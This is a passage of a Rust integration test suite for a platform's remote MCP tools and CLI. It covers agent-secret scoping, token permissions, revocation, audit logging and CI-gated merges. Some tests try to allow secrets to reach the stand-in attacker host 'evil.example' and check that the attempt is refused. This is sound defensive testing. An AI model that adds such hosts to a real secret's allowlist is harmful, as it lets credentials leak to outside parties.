    let (error, said, listed) = remote(&w, &bob, "secrets_list", shop(json!({}))).await?;
    assert!(!error, "{said}");
    assert!(
        said.contains("STRIPE_KEY") && !said.contains(VALUE) && !listed.to_string().contains(VALUE),
        "{said}"
    );
    let (error, said, _) = remote(
        &w,
        &bob,
        "secret_update",
        shop(json!({"secret": "STRIPE_KEY", "hosts": ["api.stripe.com"], "expect_hosts": []})),
    )
    .await?;
    assert!(error && said.contains("write access"), "{said}");

    let (error, said, _) = remote(
        &w,
        &alice,
        "secret_update",
        shop(json!({"secret": "STRIPE_KEY", "hosts": ["api.stripe.com"]})),
    )
    .await?;
    assert!(
        error && said.contains("expect_hosts"),
        "hosts change against what was seen: {said}"
    );
    let (error, said, updated) = remote(
        &w,
        &alice,
        "secret_update",
        shop(json!({"secret": "STRIPE_KEY", "hosts": ["api.stripe.com"], "expect_hosts": [], "description": "Stripe key for the shop"})),
    )
    .await?;
    assert!(!error, "{said}");
    assert_eq!(updated["secret"]["hosts"], json!(["api.stripe.com"]));
    assert_eq!(updated["secret"]["description"], "Stripe key for the shop");
    assert!(!updated.to_string().contains(VALUE));
    let (error, said, _) = remote(
        &w,
        &alice,
        "secret_update",
        shop(json!({"secret": "STRIPE_KEY", "value": "other"})),
    )
    .await?;
    assert!(
        error && said.contains("never goes through an agent"),
        "{said}"
    );
    let (error, said, _) =
        remote(&w, &alice, "secret_update", shop(json!({"secret": "NOPE"}))).await?;
    assert!(error && said.contains("no agent secret NOPE"), "{said}");
    let (error, said, _) = remote(
        &w,
        &alice,
        "secret_hosts_answer",
        shop(json!({"secret": "STRIPE_KEY", "allow": true, "hosts": ["evil.example"]})),
    )
    .await?;
    assert!(
        error && !said.contains("unknown tool"),
        "nothing was requested: {said}"
    );
    Ok(())
}

/// SPEC-287 RSR-001..003 (#787): `secret_update` and `secret_hosts_answer` act on the secret of
/// the name that wins for the project and the caller, as `secrets_list` shows it: the project's
/// before the caller's personal one before a global one switched on; a shadowed secret, another
/// person's personal one and a global one switched off are never reached by name.
#[tokio::test]
async fn remote_secret_tools_act_on_the_secret_that_wins() -> TestResult {
    use std::sync::atomic::Ordering;
    use yulius_app::ports::vault::VaultStore as _;
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (_, alice_browser, alice) = person(&w, "alice").await?;
    let (_, bob_browser, _) = person(&w, "bob").await?;
    let (root, _) = w.user("root", true).await?;
    let root_browser = w.browser(&root).await?;
    let root_token = make_token(&w, &root_browser, "laptop", "operate").await?;
    let root_agent = bearer(text(&root_token["token"]));
    // alice writes to the project but administers neither it nor the instance.
    w.grant("alice", "acme/shop", "push");
    w.grant("bob", "acme/shop", "push");
    w.grant("root", "acme/shop", "admin");
    let mut ids = std::collections::HashMap::new();
    for (key, creds, body) in [
        (
            "global npm",
            &root_browser,
            json!({"scope": "instance", "name": "NPM_TOKEN", "value": "global-npm-0123456789"}),
        ),
        (
            "project npm",
            &alice_browser,
            json!({"name": "NPM_TOKEN", "value": "project-npm-0123456789"}),
        ),
        (
            "global gh",
            &root_browser,
            json!({"scope": "instance", "name": "GH_TOKEN", "value": "global-gh-0123456789"}),
        ),
        (
            "bob gh",
            &bob_browser,
            json!({"scope": "personal", "name": "GH_TOKEN", "value": "bob-gh-0123456789ab"}),
        ),
        (
            "alice gh",
            &alice_browser,
            json!({"scope": "personal", "name": "GH_TOKEN", "value": "alice-gh-0123456789"}),
        ),
        (
            "bob only",
            &bob_browser,
            json!({"scope": "personal", "name": "BOB_ONLY", "value": "bob-only-0123456789"}),
        ),
        (
            "global off",
            &root_browser,
            json!({"scope": "instance", "name": "OFF_KEY", "value": "global-off-0123456789"}),
        ),
    ] {
        // Each a second after the one before: the oldest of a name is listed first.
        w.h.clock.0.fetch_add(1_000, Ordering::SeqCst);
        let created = call(
            &w.h.router,
            Method::POST,
            "/api/sandboxes/s1/agent-secrets",
            Some(body),
            creds,
        )
        .await?;
        assert_eq!(
            created.status,
            StatusCode::CREATED,
            "{key}: {}",
            created.body
        );
        ids.insert(key, text(&created.body["id"]).to_owned());
    }
    let off = call(
        &w.h.router,
        Method::PUT,
        &format!(
            "/api/sandboxes/s1/agent-secrets/{}/enabled",
            ids["global off"]
        ),
        Some(json!({"enabled": false})),
        &root_browser,
    )
    .await?;
    assert!(off.status.is_success(), "{}", off.body);
    let hosts_of = |key: &'static str| {
        let id = ids[key].clone();
        let store = &w.h.store;
        async move {
            let record = store.vault_get(&id).await?.ok_or(key)?;
            Ok::<_, Error>((record.hosts, record.requested_hosts))
        }
    };
    let none: (Vec<String>, Vec<String>) = (Vec::new(), Vec::new());
    let shop = |extra: Value| {
        let mut args = json!({"project": "acme/shop"});
        if let (Some(args), Some(extra)) = (args.as_object_mut(), extra.as_object()) {
            args.extend(extra.clone());
        }
        args
    };

    // The project's NPM_TOKEN wins over the older global one.
    let (error, said, updated) = remote(
        &w,
        &alice,
        "secret_update",
        shop(json!({"secret": "NPM_TOKEN", "hosts": ["registry.npmjs.org"], "expect_hosts": []})),
    )
    .await?;
    assert!(!error, "the project's secret, which alice manages: {said}");
    assert_eq!(updated["secret"]["hosts"], json!(["registry.npmjs.org"]));
    assert_eq!(
        hosts_of("project npm").await?.0,
        vec!["registry.npmjs.org".to_owned()]
    );
    assert_eq!(
        hosts_of("global npm").await?,
        none,
        "the global one is untouched"
    );

    // Its host request is answered on the project's secret too.
    for key in ["global npm", "project npm"] {
        let asked = ["npm.pkg.github.com".to_owned()];
        assert!(
            w.h.store
                .vault_set_request(&ids[key], &[], &asked, Some("a task"))
                .await?,
            "{key}"
        );
    }
    let (error, said, answered) = remote(
        &w,
        &alice,
        "secret_hosts_answer",
        shop(json!({"secret": "NPM_TOKEN", "allow": true, "hosts": ["npm.pkg.github.com"]})),
    )
    .await?;
    assert!(!error, "{said}");
    assert_eq!(
        answered["secret"]["hosts"],
        json!(["registry.npmjs.org", "npm.pkg.github.com"])
    );
    assert_eq!(
        hosts_of("project npm").await?,
        (
            vec![
                "registry.npmjs.org".to_owned(),
                "npm.pkg.github.com".to_owned()
            ],
            Vec::new()
        )
    );
    assert_eq!(
        hosts_of("global npm").await?,
        (Vec::new(), vec!["npm.pkg.github.com".to_owned()]),
        "the global one's request still waits"
    );

    // alice's personal GH_TOKEN wins over the older global one and bob's; bob's is never hers.
    let (error, said, _) = remote(
        &w,
        &alice,
        "secret_update",
        shop(json!({"secret": "GH_TOKEN", "hosts": ["api.github.com"], "expect_hosts": []})),
    )
    .await?;
    assert!(!error, "alice's own personal secret: {said}");
    assert_eq!(
        hosts_of("alice gh").await?.0,
        vec!["api.github.com".to_owned()]
    );
    assert_eq!(hosts_of("global gh").await?, none);
    assert_eq!(hosts_of("bob gh").await?, none);
    for tool in ["secret_update", "secret_hosts_answer"] {
        let (error, said, _) = remote(
            &w,
            &alice,
            tool,
            shop(json!({"secret": "BOB_ONLY", "hosts": ["evil.example"], "expect_hosts": [], "allow": true})),
        )
        .await?;
        assert!(
            error && said.contains("no agent secret BOB_ONLY"),
            "{tool}: {said}"
        );
    }
    assert_eq!(hosts_of("bob only").await?, none);

    // A global secret switched off for the project is not reached by name, even by an
    // administrator.
    assert!(
        w.h.store
            .vault_set_request(
                &ids["global off"],
                &[],
                &["off.example".to_owned()],
                Some("a task")
            )
            .await?
    );
    for tool in ["secret_update", "secret_hosts_answer"] {
        let (error, said, _) = remote(
            &w,
            &root_agent,
            tool,
            shop(json!({"secret": "OFF_KEY", "hosts": ["off.example"], "expect_hosts": [], "allow": true})),
        )
        .await?;
        assert!(
            error && said.contains("no agent secret OFF_KEY"),
            "{tool}: {said}"
        );
    }
    assert_eq!(
        hosts_of("global off").await?,
        (Vec::new(), vec!["off.example".to_owned()])
    );
    Ok(())
}

/// SPEC-274 PLW-004: the person's agent deletes a project's own agent secret by name with an
/// operate token and the right the Secrets page needs; refused for a read token, a reader and a
/// global secret; audited with the token and the name, never the value.
#[tokio::test]
async fn an_operate_token_deletes_a_projects_agent_secret() -> TestResult {
    use yulius_app::ports::vault::VaultStore as _;
    const VALUE: &str = "production";
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (_, browser, alice) = person(&w, "alice").await?;
    let (_, _, bob) = person(&w, "bob").await?;
    let (root, _) = w.user("root", true).await?;
    let root_browser = w.browser(&root).await?;
    w.grant("alice", "acme/shop", "admin");
    w.grant("bob", "acme/shop", "pull");
    w.grant("root", "acme/shop", "admin");
    for (creds, body) in [
        (
            &browser,
            json!({"name": "SHOP_ENVIRONMENT", "value": "production-like-1"}),
        ),
        (
            &root_browser,
            json!({"scope": "instance", "name": "GLOBAL_KEY", "value": "global-value-123"}),
        ),
        (
            &browser,
            json!({"scope": "personal", "name": "MY_KEY", "value": "personal-value-01234"}),
        ),
    ] {
        let created = call(
            &w.h.router,
            Method::POST,
            "/api/sandboxes/s1/agent-secrets",
            Some(body),
            creds,
        )
        .await?;
        assert_eq!(created.status, StatusCode::CREATED, "{}", created.body);
    }
    let read = make_token(&w, &browser, "reader", "read").await?;
    let read = bearer(text(&read["token"]));
    let shop = |secret: &str| json!({"project": "acme/shop", "secret": secret});

    let (error, said, _) = remote(&w, &read, "secret_delete", shop("SHOP_ENVIRONMENT")).await?;
    assert!(error && said.contains("read-only"), "{said}");
    let (error, said, _) = remote(&w, &bob, "secret_delete", shop("SHOP_ENVIRONMENT")).await?;
    assert!(error && said.contains("write access"), "{said}");
    let (error, said, _) = remote(&w, &alice, "secret_delete", shop("GLOBAL_KEY")).await?;
    assert!(
        error && said.contains("global") && said.contains("Secrets page"),
        "{said}"
    );
    let (error, said, _) = remote(&w, &alice, "secret_delete", shop("MY_KEY")).await?;
    assert!(
        error && said.contains("personal") && said.contains("Secrets page"),
        "{said}"
    );
    let (error, said, _) = remote(&w, &alice, "secret_delete", shop("NOPE")).await?;
    assert!(error && said.contains("no agent secret NOPE"), "{said}");

    let (error, said, deleted) =
        remote(&w, &alice, "secret_delete", shop("SHOP_ENVIRONMENT")).await?;
    assert!(!error, "{said}");
    assert_eq!(deleted["deleted"], "SHOP_ENVIRONMENT", "{deleted}");
    assert!(!deleted.to_string().contains(VALUE), "{deleted}");
    let (_, said, _) = remote(&w, &alice, "secrets_list", json!({"project": "acme/shop"})).await?;
    assert!(
        !said.contains("SHOP_ENVIRONMENT") && said.contains("GLOBAL_KEY"),
        "{said}"
    );

    let entries = audits(&w, "s1").await?;
    let tool = entries
        .iter()
        .find(|(action, _, detail)| {
            action == "remote.tool" && detail.contains("secret_delete") && detail.contains("true")
        })
        .ok_or("the delete is audited with its token")?;
    assert_eq!(tool.1, "remote:alice");
    let all = format!("{entries:?}");
    assert!(!all.contains("production-like-1"), "{all}");
    let vault =
        w.h.store
            .vault_audit(50)
            .await?
            .into_iter()
            .find(|e| e.action == "vault.agent.delete")
            .ok_or("vault.agent.delete")?;
    assert!(
        format!("{vault:?}").contains("SHOP_ENVIRONMENT"),
        "{vault:?}"
    );
    Ok(())
}

/// Runs the `yulius` binary with `args` (configuration under `home`, `stdin` piped); returns its
/// exit code, stdout and stderr.
async fn yulius_cli(
    home: &std::path::Path,
    args: &[&str],
    stdin: &str,
) -> Result<(Option<i32>, String, String), Error> {
    let (home, stdin) = (home.to_path_buf(), stdin.to_owned());
    let args: Vec<String> = args.iter().map(|a| (*a).to_owned()).collect();
    let out = tokio::task::spawn_blocking(move || -> std::io::Result<std::process::Output> {
        use std::io::Write as _;
        let mut child = std::process::Command::new(env!("CARGO_BIN_EXE_yulius"))
            .args(&args)
            .env("HOME", &home)
            .env("XDG_CONFIG_HOME", home.join(".config"))
            .env_remove("YULIUS_SERVER")
            .env_remove("YULIUS_PROJECT")
            .current_dir(&home)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()?;
        if let Some(mut input) = child.stdin.take() {
            input.write_all(stdin.as_bytes())?;
        }
        child.wait_with_output()
    })
    .await??;
    Ok((
        out.status.code(),
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
    ))
}

/// RMT-030, RMT-031: the CLI stores a checked token apart from `yulius login`'s and calls the
/// same tools; a tool's refusal exits 1, a request that reached no tool exits 2.
#[tokio::test]
async fn the_cli_drives_the_remote_mcp_with_a_stored_token() -> TestResult {
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (alice, _) = w.user("alice", false).await?;
    w.grant("alice", "acme/shop", "admin");
    let browser = w.browser(&alice).await?;
    let made = make_token(&w, &browser, "laptop", "operate").await?;
    let token = text(&made["token"]).to_owned();
    let served = support::serve(w.h.router.clone()).await?;
    let url = format!("http://{}", served.addr);
    let home = tempfile::tempdir()?;
    let home = home.path();

    let (code, _, err) = yulius_cli(home, &["task", "list", "-p", "acme/shop"], "").await?;
    assert_eq!(code, Some(2), "{err}");
    assert!(err.contains("yulius remote login"), "{err}");
    let (code, _, err) = yulius_cli(
        home,
        &["remote", "login", &url, "--token-stdin"],
        "yul_wrong\n",
    )
    .await?;
    assert_eq!(code, Some(2), "{err}");
    assert!(err.contains("refused the token"), "{err}");

    let (code, out, err) = yulius_cli(
        home,
        &["remote", "login", &url, "--token-stdin"],
        &format!("{token}\n"),
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(out.contains("as alice (operate token)"), "{out}");
    let stored = home.join(".config/yulius/remote-credentials.json");
    let mode = std::os::unix::fs::PermissionsExt::mode(&std::fs::metadata(&stored)?.permissions());
    assert_eq!(mode & 0o077, 0, "only its owner reads it");
    assert!(
        !home.join(".config/yulius/credentials.json").exists(),
        "yulius login's store is untouched"
    );

    let (code, out, _) = yulius_cli(home, &["remote", "status"], "").await?;
    assert_eq!(code, Some(0));
    assert!(out.contains("signed in as alice (operate token)"), "{out}");
    let (code, out, err) = yulius_cli(home, &["project", "list", "--json"], "").await?;
    assert_eq!(code, Some(0), "{err}");
    let listed: Value = serde_json::from_str(&out)?;
    assert_eq!(listed["projects"][0]["project"], "acme/shop", "{out}");
    let (code, _, err) = yulius_cli(home, &["task", "list", "-p", "acme/shop"], "").await?;
    assert_eq!(code, Some(0), "{err}");
    let (code, out, err) = yulius_cli(
        home,
        &[
            "remote",
            "call",
            "tasks_list",
            "{\"scope\": \"active\"}",
            "-p",
            "acme/shop",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    let (code, out, _) = yulius_cli(home, &["remote", "tools"], "").await?;
    assert_eq!(code, Some(0));
    assert!(
        out.contains("task_restart") && out.contains("project_change"),
        "{out}"
    );
    let (code, _, err) =
        yulius_cli(home, &["task", "restart", "999", "-p", "acme/shop"], "").await?;
    assert_eq!(code, Some(1), "{err}");
    assert!(err.to_lowercase().contains("not found"), "{err}");

    // Revoked on Settings: the next command says so and reaches no tool.
    let revoked = call(
        &w.h.router,
        Method::DELETE,
        &format!("/api/me/tokens/{}", text(&made["view"]["id"])),
        None,
        &browser,
    )
    .await?;
    assert_eq!(revoked.status, StatusCode::NO_CONTENT);
    let (code, _, err) = yulius_cli(home, &["task", "list", "-p", "acme/shop"], "").await?;
    assert_eq!(code, Some(2), "{err}");
    assert!(err.contains("wrong or revoked"), "{err}");
    let (code, out, _) = yulius_cli(home, &["remote", "logout"], "").await?;
    assert_eq!(code, Some(0), "{out}");
    Ok(())
}

/// SPEC-274 PLW-005: `yulius secrets delete NAME` deletes the project's agent secret through
/// `secret_delete` with the stored operate token; an unknown name is the tool's refusal (exit 1).
#[tokio::test]
async fn the_cli_deletes_an_agent_secret_by_name() -> TestResult {
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (_, browser, alice) = person(&w, "alice").await?;
    w.grant("alice", "acme/shop", "admin");
    let created = call(
        &w.h.router,
        Method::POST,
        "/api/sandboxes/s1/agent-secrets",
        Some(json!({"name": "OPS_EMAIL", "value": "ops@example.com"})),
        &browser,
    )
    .await?;
    assert_eq!(created.status, StatusCode::CREATED, "{}", created.body);
    let served = support::serve(w.h.router.clone()).await?;
    let url = format!("http://{}", served.addr);
    let home = tempfile::tempdir()?;
    let home = home.path();
    let token = alice.bearer.clone().ok_or("token")?;
    let (code, out, err) = yulius_cli(
        home,
        &["remote", "login", &url, "--token-stdin"],
        &format!("{token}\n"),
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");

    let (code, out, err) = yulius_cli(
        home,
        &["secrets", "delete", "OPS_EMAIL", "-p", "acme/shop"],
        "",
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(out.contains("OPS_EMAIL"), "{out}");
    assert!(!out.contains("ops@example.com"), "{out}");
    let (_, said, _) = remote(&w, &alice, "secrets_list", json!({"project": "acme/shop"})).await?;
    assert!(!said.contains("OPS_EMAIL"), "{said}");
    let (code, _, err) = yulius_cli(
        home,
        &["secrets", "delete", "OPS_EMAIL", "-p", "acme/shop"],
        "",
    )
    .await?;
    assert_eq!(code, Some(1), "{err}");
    assert!(err.contains("no agent secret OPS_EMAIL"), "{err}");
    Ok(())
}

/// The acceptance flow of SPEC-247: with only the instance's URL and a token made in Settings, a
/// person's agent imports a repository, starts its onboarding, sets up Yulius CI through a change
/// pull request merged on green, and creates, messages, stops and archives a task, all through
/// the remote MCP.
#[tokio::test]
async fn a_repository_is_onboarded_end_to_end_from_a_laptop() -> TestResult {
    use yulius_app::ports::store_ext::CiStore as _;
    use yulius_domain::ci::RunState;
    let w = World::new("org").await?;
    // The person's one visit to the web UI: making the token.
    let (_, _, agent) = person(&w, "alice").await?;
    let origin = w.remote(
        support::repos::OWNER,
        "shop",
        &[("README.md", "# Shop\n"), ("src/main.rs", "fn main() {}\n")],
        &["dev"],
    )?;
    w.h.github
        .set_remote(std::sync::Arc::new(Origin(origin.clone())));
    w.github
        .add_installation_repo(support::repos::OWNER, "shop", true);
    w.grant("alice", "shop", "admin");
    let shop = |extra: Value| {
        let mut args = json!({"project": "Quartio-Studio/shop"});
        if let (Some(args), Some(extra)) = (args.as_object_mut(), extra.as_object()) {
            args.extend(extra.clone());
        }
        args
    };
    let ok = |(error, said, record): (bool, String, Value)| -> Result<Value, Error> {
        if error {
            return Err(said.into());
        }
        Ok(record)
    };

    // Import and onboard.
    let repos = ok(remote(&w, &agent, "repositories_list", json!({})).await?)?;
    assert!(repos.to_string().contains("\"shop\""), "{repos}");
    let imported = ok(remote(
        &w,
        &agent,
        "project_import",
        json!({"repo": "Quartio-Studio/shop"}),
    )
    .await?)?;
    assert_eq!(imported["onboarding"], "pending");
    let project = ok(remote(&w, &agent, "project_get", shop(json!({}))).await?)?;
    assert_eq!(project["onboarding"]["state"], "pending", "{project}");
    let started = ok(remote(&w, &agent, "onboarding_start", shop(json!({}))).await?)?;
    assert_eq!(started["onboarding"], "preparing");
    let tasks = ok(remote(&w, &agent, "tasks_list", shop(json!({}))).await?)?;
    assert!(
        tasks.to_string().contains("Prepare"),
        "the onboarding task is listed: {tasks}"
    );

    // CI: read the repository, add [[ci.jobs]] in a change pull request, merge it on green.
    let files = ok(remote(&w, &agent, "project_files", shop(json!({}))).await?)?;
    assert!(
        !files["entries"].to_string().contains("yulius.toml"),
        "{files}"
    );
    let toml = "[[ci.jobs]]\nname = \"test\"\ncommand = \"cargo test\"\n";
    let change = ok(remote(
        &w,
        &agent,
        "project_change",
        shop(json!({"title": "ci: run cargo test in Yulius CI", "files": [{"path": "yulius.toml", "content": toml}]})),
    )
    .await?)?;
    let number = change["pull_request"]["number"].as_u64().ok_or("number")?;
    let record =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?;
    w.h.app.ci_sync_sandbox(&record).await?; // Yulius CI's poll
    let ci = ok(remote(&w, &agent, "ci_runs", shop(json!({}))).await?)?;
    let run = ci["runs"]
        .as_array()
        .and_then(|runs| runs.iter().find(|r| r["sha"] == change["commit"]))
        .cloned()
        .ok_or_else(|| format!("the change is tested: {ci}"))?;
    let detail = ok(remote(&w, &agent, "ci_run", shop(json!({"run_id": run["id"]}))).await?)?;
    assert!(
        detail.to_string().contains("cargo test"),
        "the pull request's own job: {detail}"
    );
    let (error, said, _) =
        remote(&w, &agent, "change_merge", shop(json!({"number": number}))).await?;
    assert!(error && said.contains("pending"), "{said}");
    // The runner's verdict (CI execution itself: local_ci.rs).
    w.h.store
        .transition_ci_run(
            text(&run["id"]),
            &[RunState::Queued],
            RunState::Passed,
            &yulius_app::ci::CiRunUpdate::default(),
        )
        .await?;
    ok(remote(&w, &agent, "change_merge", shop(json!({"number": number}))).await?)?;
    assert_eq!(
        origin_file(&origin, "dev", "yulius.toml").as_deref(),
        Some(toml)
    );
    w.h.app.ci_sync_sandbox(&record).await?;
    let ci = ok(remote(&w, &agent, "ci_runs", shop(json!({}))).await?)?;
    assert!(
        ci["gate"].to_string().contains("cargo test"),
        "dev's CI is in force: {ci}"
    );
    let read = ok(remote(
        &w,
        &agent,
        "project_file_read",
        shop(json!({"path": "yulius.toml"})),
    )
    .await?)?;
    assert_eq!(read["content"], toml);

    // A task: created, told something, stopped and archived.
    let created = ok(remote(
        &w,
        &agent,
        "task_create",
        shop(json!({"prompt": "Add a /health endpoint that answers 200 with the version", "title": "Health endpoint"})),
    )
    .await?)?;
    let number = created["task"]["number"]
        .as_u64()
        .ok_or_else(|| format!("{created}"))?;
    let listed = ok(remote(&w, &agent, "tasks_list", shop(json!({}))).await?)?;
    assert!(listed.to_string().contains("Health endpoint"), "{listed}");
    let got = ok(remote(&w, &agent, "task_get", shop(json!({"number": number}))).await?)?;
    assert!(got.to_string().contains("/health"), "{got}");
    let told = ok(remote(
        &w,
        &agent,
        "task_message",
        shop(json!({"number": number, "text": "Use the existing router"})),
    )
    .await?)?;
    assert!(
        told.to_string().contains("queued"),
        "it has not started (onboarding runs): {told}"
    );
    ok(remote(&w, &agent, "task_stop", shop(json!({"number": number}))).await?)?;
    ok(remote(&w, &agent, "task_archive", shop(json!({"number": number}))).await?)?;
    let archived = ok(remote(&w, &agent, "tasks_list", shop(json!({"scope": "archived"}))).await?)?;
    assert!(
        archived.to_string().contains("Health endpoint"),
        "{archived}"
    );
    Ok(())
}

/// RMT-002: a read-only token opens no WebSocket. A terminal's socket is a GET that types into a
/// task, so the safe-method rule alone would let a read token write through it.
#[tokio::test]
async fn a_read_token_opens_no_websocket() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let read = bearer(text(
        &make_token(&w, &browser, "watch", "read").await?["token"],
    ));
    let operate = bearer(text(
        &make_token(&w, &browser, "laptop", "operate").await?["token"],
    ));
    let served = support::serve(w.h.router.clone()).await?;
    let refused = support::ws_connect(served.addr, "/api/events", &read, "https://yulius.test")
        .await
        .err()
        .ok_or("a read token opened a WebSocket")?;
    assert_eq!(support::ws_refusal_status(&refused), Some(403), "{refused}");
    let opened =
        support::ws_connect(served.addr, "/api/events", &operate, "https://yulius.test").await;
    assert!(
        opened.is_ok(),
        "an operate token is not refused: {:?}",
        opened.err()
    );
    Ok(())
}

/// RMT-001: a revoked token ends at once, also where it was already in use: the open sockets'
/// recheck refuses it (review finding 3).
#[tokio::test]
async fn a_revoked_token_no_longer_holds_its_open_connections() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let made = make_token(&w, &browser, "laptop", "operate").await?;
    let ctx =
        w.h.app
            .authenticate_bearer(text(&made["token"]))
            .await?
            .ok_or("the token authenticates")?;
    assert!(w.h.app.still_signed_in(&ctx).await);
    let revoked = call(
        &w.h.router,
        Method::DELETE,
        &format!("/api/me/tokens/{}", text(&made["view"]["id"])),
        None,
        &browser,
    )
    .await?;
    assert_eq!(revoked.status, StatusCode::NO_CONTENT);
    assert!(
        !w.h.app.still_signed_in(&ctx).await,
        "a socket opened with it closes at its next check"
    );
    Ok(())
}

/// A token cannot mint tokens: `yulius login`'s device approval needs the person in the browser,
/// so an agent's token cannot approve a CLI token that outlives it (review finding 4).
#[tokio::test]
async fn only_the_browser_approves_a_cli_sign_in() -> TestResult {
    let w = World::new("org").await?;
    let (_, browser, operate) = person(&w, "alice").await?;
    let start = call(
        &w.h.router,
        Method::POST,
        "/api/device/start",
        None,
        &Creds::default(),
    )
    .await?;
    assert_eq!(start.status, StatusCode::OK, "{}", start.body);
    let code = json!({"user_code": start.body["user_code"], "approve": true});
    let refused = call(
        &w.h.router,
        Method::POST,
        "/api/device/approve",
        Some(code.clone()),
        &operate,
    )
    .await?;
    assert_eq!(refused.status, StatusCode::FORBIDDEN, "{}", refused.body);
    let approved = call(
        &w.h.router,
        Method::POST,
        "/api/device/approve",
        Some(code),
        &browser,
    )
    .await?;
    assert_eq!(approved.status, StatusCode::NO_CONTENT, "{}", approved.body);
    Ok(())
}

/// RMT-025: a change carries what it promises (files of 256 KiB, several of them), past the API's
/// 1 MiB body limit for other requests (review finding 5).
#[tokio::test]
async fn a_change_of_several_large_files_fits_in_one_request() -> TestResult {
    let w = World::new("org").await?;
    let (alice, origin) = imported_shop(&w, &[("README.md", "# Shop\n")]).await?;
    let big = "x".repeat(255 * 1024);
    let files: Vec<Value> = (0..6)
        .map(|n| json!({"path": format!("data/{n}.txt"), "content": big}))
        .collect();
    let (error, said, changed) = remote(
        &w,
        &alice,
        "project_change",
        json!({"project": "Quartio-Studio/shop", "title": "data", "files": files}),
    )
    .await?;
    assert!(!error, "{said}");
    let branch = text(&changed["branch"]).to_owned();
    assert_eq!(
        origin_file(&origin, &branch, "data/5.txt").map(|t| t.len()),
        Some(big.len())
    );

    // With Yulius CI on the pull request, a failed run at its head refuses the merge.
    use yulius_app::ports::store_ext::CiStore as _;
    use yulius_domain::ci::RunState;
    let (error, said, ci) = remote(
        &w,
        &alice,
        "project_change",
        json!({"project": "Quartio-Studio/shop", "title": "ci", "files": [{"path": "yulius.toml", "content": "[[ci.jobs]]\nname = \"test\"\ncommand = \"false\"\n"}]}),
    )
    .await?;
    assert!(!error, "{said}");
    let number = ci["pull_request"]["number"].as_u64().ok_or("number")?;
    let record =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?;
    w.h.app.ci_sync_sandbox(&record).await?;
    let runs =
        w.h.store
            .ci_runs_for_sha(&record.id, text(&ci["commit"]))
            .await?;
    let run = runs.first().ok_or("a run of the pull request")?;
    w.h.store
        .transition_ci_run(
            &run.id,
            &[RunState::Queued],
            RunState::Failed,
            &yulius_app::ci::CiRunUpdate::default(),
        )
        .await?;
    let (error, said, _) = remote(
        &w,
        &alice,
        "change_merge",
        json!({"project": "Quartio-Studio/shop", "number": number}),
    )
    .await?;
    assert!(error && said.contains("failure"), "{said}");
    Ok(())
}

/// RMT-015: every call of a tool that changes something is audited, refused ones too: by a
/// read-only token, or on a project that cannot be found (review finding 7). Without a project the
/// entry's target is the token.
#[tokio::test]
async fn refused_changes_are_audited_against_the_token() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let read = make_token(&w, &browser, "watch", "read").await?;
    let operate = make_token(&w, &browser, "laptop", "operate").await?;
    let (error, _, _) = remote(
        &w,
        &bearer(text(&read["token"])),
        "project_import",
        json!({"repo": "Quartio-Studio/x"}),
    )
    .await?;
    assert!(error);
    let (error, _, _) = remote(
        &w,
        &bearer(text(&operate["token"])),
        "task_create",
        json!({"project": "acme/ghost", "prompt": "x"}),
    )
    .await?;
    assert!(error);
    for (made, tool) in [(&read, "project_import"), (&operate, "task_create")] {
        let id = text(&made["view"]["id"]);
        let entries = audits(&w, &format!("token:{id}")).await?;
        assert!(
            entries
                .iter()
                .any(|(action, actor, detail)| action == "remote.tool"
                    && actor == "remote:alice"
                    && detail.contains(&format!("\"tool\":\"{tool}\""))
                    && detail.contains("\"ok\":false")),
            "{tool}: {entries:?}"
        );
    }
    Ok(())
}

/// RMT-010 (round-2 review): the public `/mcp` checks the token before it reads a body, so
/// nobody without a token makes the server hold a large one.
#[tokio::test]
async fn the_token_is_checked_before_the_body_is_read() -> TestResult {
    let w = World::new("org").await?;
    let huge = "x".repeat(33 << 20);
    let refused = call(
        &w.h.router,
        Method::POST,
        "/mcp",
        Some(json!({"jsonrpc": "2.0", "id": 1, "method": "ping", "params": {"pad": huge}})),
        &bearer("yul_unknown"),
    )
    .await?;
    assert_eq!(refused.status, StatusCode::UNAUTHORIZED);
    let (alice, _) = w.user("alice", false).await?;
    let browser = w.browser(&alice).await?;
    let operate = bearer(text(
        &make_token(&w, &browser, "laptop", "operate").await?["token"],
    ));
    let large = call(
        &w.h.router,
        Method::POST,
        "/mcp",
        Some(json!({"jsonrpc": "2.0", "id": 1, "method": "ping", "params": {"pad": huge}})),
        &operate,
    )
    .await?;
    assert_eq!(large.status, StatusCode::PAYLOAD_TOO_LARGE);
    Ok(())
}

/// RMT-026 (round-2 review): a change whose `yulius.toml` Yulius CI cannot read is refused rather
/// than merged unchecked, and when the integration branch's own CI configuration is broken (so
/// Yulius CI tests nothing) the merge says so instead of waiting for ever.
#[tokio::test]
async fn a_change_with_unreadable_ci_is_never_merged_unchecked() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = imported_shop(&w, &[("README.md", "# Shop\n")]).await?;
    let shop = |extra: Value| {
        let mut args = json!({"project": "Quartio-Studio/shop"});
        if let (Some(args), Some(extra)) = (args.as_object_mut(), extra.as_object()) {
            args.extend(extra.clone());
        }
        args
    };
    let broken = "[[ci.jobs]]\nname = 3\n";
    let (error, said, change) = remote(
        &w,
        &alice,
